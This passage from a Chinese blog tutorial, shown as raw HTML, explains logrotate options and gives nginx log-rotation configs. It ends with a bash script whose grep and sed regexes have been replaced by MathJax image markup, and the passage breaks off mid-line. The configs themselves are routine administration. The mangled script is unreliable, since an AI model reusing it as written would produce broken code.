class=\"crayon-e\">olddir </span><span class=\"crayon-i\">directory</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-16\"><span class=\"crayon-i\">noolddir</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>转储后的日志文件和当前日志文件放在同一个目录下</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-17\"><span class=\"crayon-i\">sharedscripts</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>运行<span class=\"crayon-i\">postrotate</span>脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-18\"><span class=\"crayon-i\">prerotate</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>在<span class=\"crayon-i\">logrotate</span>转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-19\"><span class=\"crayon-i\">postrotate</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>在<span class=\"crayon-i\">logrotate</span>转储之后需要执行的指令，例如重新启动<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">HUP</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>某个服务！必须独立成行</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-20\"><span class=\"crayon-i\">daily</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>指定转储周期为每天</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-21\"><span class=\"crayon-i\">weekly</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 指定转储周期为每周</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-22\"><span class=\"crayon-i\">monthly</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 指定转储周期为每月</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-23\"><span class=\"crayon-e\">rotate </span><span class=\"crayon-i\">count</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 指定日志文件删除之前转储的次数，<span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span>指没有备份，<span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>指保留<span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>个备份</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-24\"><span class=\"crayon-i\">dateext</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 使用当期日期作为命名格式</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-25\"><span class=\"crayon-i\">dateformat</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>配合<span class=\"crayon-i\">dateext</span>使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合<span class=\"crayon-i\">dateext</span>使用，只支持<span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">Y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span>这四个参数</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-26\"><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span>或<span class=\"crayon-v\">minsize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>当日志文件到达指定的大小时才转储，<span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span>能指定<span class=\"crayon-e\">bytes</span><span class=\"crayon-sy\">(</span>缺省<span class=\"crayon-sy\">)</span>及<span class=\"crayon-e\">KB</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sizek</span><span class=\"crayon-sy\">)</span>或<span class=\"crayon-e\">MB</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sizem</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-28\">当日志文件<span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span>的时候就转储。<span class=\"crayon-h\"> </span>以下为合法格式：（其他格式的单位大小写没有试过）</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-29\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>（<span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span>个字节就转储）</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-30\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100k</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100k</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-31\"><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100M</span><span class=\"crayon-h\"> </span>或<span class=\"crayon-h\"> </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100M</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0164 seconds] -->\r\n<p>小示例：下面一个切割nginx日志的配置</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b8e965236760\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@master-server ~]# vim /etc/logrotate.d/nginx \r\n/usr/local/nginx/logs/*.log {\r\ndaily\r\nrotate 7 \r\nmissingok\r\nnotifempty\r\ndateext\r\nsharedscripts\r\npostrotate\r\n    if [ -f /usr/local/nginx/logs/nginx.pid ]; then\r\n        kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`\r\n    fi\r\nendscript\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b8e965236760-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b8e965236760-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># vim /etc/logrotate.d/nginx </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-3\"><span class=\"crayon-e\">daily</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-4\"><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-5\"><span class=\"crayon-e\">missingok</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-6\"><span class=\"crayon-e\">notifempty</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-7\"><span class=\"crayon-e\">dateext</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-8\"><span class=\"crayon-e\">sharedscripts</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-9\"><span class=\"crayon-e\">postrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">USR1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b8e965236760-13\"><span class=\"crayon-i\">endscript</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b8e965236760-14\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>——————–分享一例曾经使用过的nginx日志切割处理脚本———————–<br>\n<strong>1）logrotate日志分割配置：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b92936714879\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@bastion-IDC ~# vim /etc/logrotate.d/nginx\r\n/data/nginx_logs/*.access_log         \r\n{\r\nnocompress                                    \r\ndaily                                   \r\ncopytruncate                                   \r\ncreate                               \r\nifempty                                    \r\nolddir /data/nginx_logs/days            \r\nrotate 0                                         \r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b92936714879-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b92936714879-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b92936714879-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b92936714879-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b92936714879-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b92936714879-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">IDC</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># vim /etc/logrotate.d/nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b92936714879-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx_logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">access</span><span class=\"crayon-sy\">_</span>log<span class=\"crayon-h\">         </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-3\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b92936714879-4\"><span class=\"crayon-e\">nocompress                                    </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-5\"><span class=\"crayon-e\">daily                                   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b92936714879-6\"><span class=\"crayon-e\">copytruncate                                   </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-7\"><span class=\"crayon-e\">create                               </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b92936714879-8\"><span class=\"crayon-e\">ifempty                                    </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-9\"><span class=\"crayon-v\">olddir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx_logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">days            </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b92936714879-10\"><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                                         </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b92936714879-11\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p><strong>2）日志分割脚本</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b95580581069\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@bastion-IDC ~# vim /usr/local/sbin/logrotate-nginx.sh\r\n#!/bin/bash\r\n#创建转储日志压缩存放目录\r\nmkdir -p /data/nginx_logs/days\r\n#手工对nginx日志进行切割转换\r\n/usr/sbin/logrotate -vf /etc/logrotate.d/nginx\r\n#当前时间\r\ntime=$(date -d \"yesterday\" +\"%Y-%m-%d\")\r\n#进入转储日志存放目录\r\ncd /data/nginx_logs/days\r\n#对目录中的转储日志文件的文件名进行统一转换\r\nfor i in $(ls ./ | grep \"^<span class=\"MathJax_Preview\"><img src=\"http://blog.jobbole.com/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif\" style=\"vertical-align: middle; border: none; padding-bottom:2px;\" class=\"tex\" alt=\".*\"></span><script type=\"math/tex\">.*</script>\\.[[:digit:]]$\")\r\ndo\r\nmv ${i} ./$(echo ${i}|sed -n 's/^<span class=\"MathJax_Preview\"><img src=\"http://blog.jobbole.com/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif\" style=\"vertical-align: middle; border: none; padding-bottom:2px;\" class=\"tex\" alt=\".*\"></span><script type=\"math/tex\">.*</script>\\.<span class=\"MathJax_Preview\"><img 